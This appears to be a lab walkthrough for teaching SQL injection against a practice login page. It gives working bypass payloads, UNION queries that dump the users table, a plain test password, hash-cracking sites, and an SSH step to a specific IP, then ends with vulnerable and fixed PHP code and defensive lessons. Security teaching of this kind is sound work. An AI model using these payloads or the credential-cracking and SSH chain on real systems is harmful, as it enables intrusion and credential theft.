# SQL Injection Lab - Complete Walkthrough

## ⚠️ INSTRUCTOR/STUDENT REFERENCE ONLY
**Do not display this information on the login page**

---

## Valid Test Account
- **Email:** admin@wallys.com
- **Password:** 123456

---

## SQL Injection Attack Methods

### Method 1: Basic Authentication Bypass
**Email field:** `admin@wallys.com' OR '1'='1`  
**Password:** `anything`

### Method 2: Comment-Based Bypass
**Email field:** `admin@wallys.com' --`  
**Password:** `anything`

### Method 3: Universal Bypass
**Email field:** `' OR '1'='1' --`  
**Password:** `anything`

---

## Database Enumeration (UNION Attack)

### Step 1: Find Column Count
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
Continue until you find the right number of columns.

### Step 2: Identify Injectable Columns
```sql
' UNION SELECT 1,2,3,4,5,6,7,8,9--
```

### Step 3: Database Dump Query
```sql
' UNION SELECT id,email,password,user_type,5,6,7,8,9 FROM users WHERE user_type='admin'--
```

### Full Dump Example:
```sql
' UNION SELECT 
    id,
    email,
    password,
    user_type,
    5,6,7,8,9 
FROM users 
WHERE user_type='admin'--
```

---

## Expected Results

### After Successful Injection:
1. **Bypassed Authentication** - Logged in without valid credentials
2. **Admin Access** - Full administrative privileges
3. **Database Visibility** - Can see all user records
4. **Password Hashes** - MD5 or plaintext passwords exposed

### Information to Extract:
- User credentials
- Admin accounts
- Database structure
- System configuration
- SSH credentials (if stored)

---

## Post-Exploitation

### Password Cracking (if MD5):
1. Copy MD5 hashes from database dump
2. Use online tools:
   - crackstation.net
   - md5decrypt.net
   - hashkiller.io

### SSH Access:
Once passwords are cracked:
```bash
ssh admin@155.138.197.128
# Use cracked password
```

---

## Defensive Measures (Teaching Points)

### What Makes This Vulnerable:
```php
// VULNERABLE CODE
$query = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
```

### How to Fix:
```php
// SECURE CODE
$stmt = $conn->prepare("SELECT * FROM users WHERE email = ? AND password = ?");
$stmt->bind_param("ss", $email, $password);
```

### Key Lessons:
1. Never concatenate user input into SQL queries
2. Always use prepared statements
3. Implement input validation
4. Use proper password hashing (bcrypt, not MD5)
5. Limit database user privileges
6. Hide error messages in production

---

## Testing Checklist

- [ ] Test normal login with valid credentials
- [ ] Test SQL injection with `' OR '1'='1`
- [ ] Test comment injection with `admin' --`
- [ ] Perform UNION attack to dump data
- [ ] Extract admin credentials
- [ ] Crack any hashed passwords
- [ ] Attempt SSH with obtained credentials
- [ ] Document all findings

---

## Notes
- This is for educational purposes only
- Only use in authorized lab environments
- Practice responsible disclosure
- Never test on production systems without permission